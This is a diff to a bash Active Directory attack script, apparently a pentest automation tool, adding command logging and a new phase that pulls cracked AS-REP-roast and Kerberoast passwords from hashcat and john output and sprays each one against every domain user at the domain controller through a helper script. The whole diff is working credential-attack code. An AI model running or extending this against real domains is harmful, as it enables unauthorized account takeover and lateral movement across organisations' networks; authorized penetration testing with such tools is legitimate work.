@@ -46,7 +46,10 @@ success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
 warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
 error()   { echo -e "${RED}[$(ts)] [-]${NC} $*" >&2; }
 phase()   { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }
-cmd_log() { echo -e "${CYAN}[$(ts)] [CMD]${NC} $*"; }
+cmd_log() {
+    echo -e "${CYAN}[$(ts)] [CMD]${NC} $*"
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] CMD: $*" >> "${OUTDIR}/cmd_log.txt" 2>/dev/null || true
+}
 
 #------------------------------------------------------------------------------
 # PROGRESS TRACKING
@@ -945,6 +948,108 @@ phase8_sessions() {
 }
 
 #==============================================================================
+# PHASE 9 — SPRAY CRACKED PASSWORDS
+#==============================================================================
+phase9_spray_cracked() {
+    if [[ "$QUICK_MODE" == true ]]; then
+        info "Spray phase skipped (--quick)"
+        progress_log "SKIP" "phase9_spray_cracked" "quick mode"
+        return 0
+    fi
+
+    local phase_key="phase9_spray_cracked"
+    if is_phase_done "$phase_key"; then
+        info "Phase 9 already complete (--force to redo)"
+        return 0
+    fi
+
+    phase "9 — Spray Cracked Passwords"
+    progress_log "START" "$phase_key" ""
+
+    local script_dir
+    script_dir="$(cd "$(dirname "$0")" && pwd)"
+    local sprayr="${script_dir}/sprayr.sh"
+    local user_list="${OUTDIR}/users/all_users.txt"
+    local asrep_file="${OUTDIR}/hashes/asreproast.txt"
+    local kerb_file="${OUTDIR}/hashes/kerberoast.txt"
+    local cracked_file="${OUTDIR}/hashes/cracked_passwords.txt"
+    local potfile="${HOME}/crackr_output/hashcat.potfile"
+
+    # Check prerequisites
+    if [[ ! -x "$sprayr" ]]; then
+        warn "sprayr.sh not found at ${sprayr} — skipping spray phase"
+        progress_log "SKIP" "$phase_key" "sprayr.sh not found"
+        return 0
+    fi
+    if [[ ! -s "$user_list" ]]; then
+        warn "No user list found — skipping spray phase"
+        progress_log "SKIP" "$phase_key" "no user list"
+        return 0
+    fi
+
+    # Extract cracked passwords from hashcat potfile and john
+    : > "$cracked_file"
+
+    local hash_file mode
+    for hash_file in "$asrep_file" "$kerb_file"; do
+        [[ -s "$hash_file" ]] || continue
+
+        # Determine hashcat mode
+        if [[ "$hash_file" == *asreproast* ]]; then
+            mode=18200
+        else
+            mode=13100
+        fi
+
+        # Try hashcat --show (output format: hash:password)
+        if [[ -f "$potfile" ]]; then
+            hashcat -m "$mode" "$hash_file" --potfile-path "$potfile" --show 2>/dev/null \
+                | rev | cut -d: -f1 | rev \
+                >> "$cracked_file" || true
+        fi
+
+        # Try john --show (output format: user:password)
+        john --show "$hash_file" 2>/dev/null \
+            | grep -v "^$" | grep -v "password hashes cracked" \
+            | cut -d: -f2 \
+            >> "$cracked_file" || true
+    done
+
+    # Deduplicate and remove empty lines
+    if [[ -s "$cracked_file" ]]; then
+        sort -u "$cracked_file" | grep -v '^\s*$' > "${cracked_file}.tmp" 2>/dev/null
+        mv "${cracked_file}.tmp" "$cracked_file"
+    fi
+
+    local cracked_count=0
+    [[ -s "$cracked_file" ]] && cracked_count=$(wc -l < "$cracked_file")
+
+    if (( cracked_count == 0 )); then
+        info "No cracked passwords found"
+        info "Run crackr.sh first if you haven't:"
+        [[ -s "$asrep_file" ]] && info "  ./crackr.sh -f ${asrep_file}"
+        [[ -s "$kerb_file" ]]  && info "  ./crackr.sh -f ${kerb_file}"
+        progress_log "SKIP" "$phase_key" "no cracked passwords"
+        return 0
+    fi
+
+    local user_count
+    user_count=$(wc -l < "$user_list")
+    success "Found ${cracked_count} cracked password(s), ${user_count} domain users"
+    success "Spraying all cracked passwords against user list..."
+
+    local pw
+    while IFS= read -r pw; do
+        [[ -z "$pw" ]] && continue
+        info "Spraying password: ${pw:0:3}***"
+        cmd_log "${sprayr} -U ${user_list} -p '***' -d ${DOMAIN} -t ${DC_IP} --safe --quick"
+        "$sprayr" -U "$user_list" -p "$pw" -d "$DOMAIN" -t "$DC_IP" --safe --quick || true
+    done < "$cracked_file"
+
+    progress_log "DONE" "$phase_key" "passwords=${cracked_count}"
+}
+
+#==============================================================================
 # SUMMARY GENERATION
 #==============================================================================
 write_summary() {
@@ -1265,6 +1370,7 @@ main() {
         phase6_bloodhound
         phase7_shares
         phase8_sessions
+        phase9_spray_cracked
     fi
 
     write_summary
